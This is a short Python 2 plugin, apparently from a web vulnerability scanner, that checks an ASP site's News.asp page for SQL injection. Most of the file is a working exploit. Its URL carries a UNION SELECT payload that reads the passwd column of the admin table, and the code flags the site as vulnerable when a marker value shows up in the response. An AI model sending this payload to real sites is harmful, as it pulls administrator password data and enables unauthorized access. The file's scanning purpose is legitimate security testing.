#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    list = []
    try:
        domain = ob['domain']
        detail = u''
        detail = detail.encode('utf8')
    
        url = "%s://%s%s" % (ob['scheme'],domain,ob['base_path'])
        url += "News.asp?click=1&shu=20%201%20as%20NewsID,88888888-1%20as%20title,3%20as%20updatetime,passwd%20as%20click,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29%20from%20admin%20union%20select%20top%202"
        res, content = requestUrl(http,url,ob['task_id'],ob['domain_id'])
        if res['status'] == '200' and content.find('document.write')>=0 and content.find('88888887')>=0:
            request = getRequest(url)
            response = getResponse(res)            
            list.append(getRecord(ob,url,ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:Ft_News_SqlInjectionScript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:Ft_News_SqlInjectionScript.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def
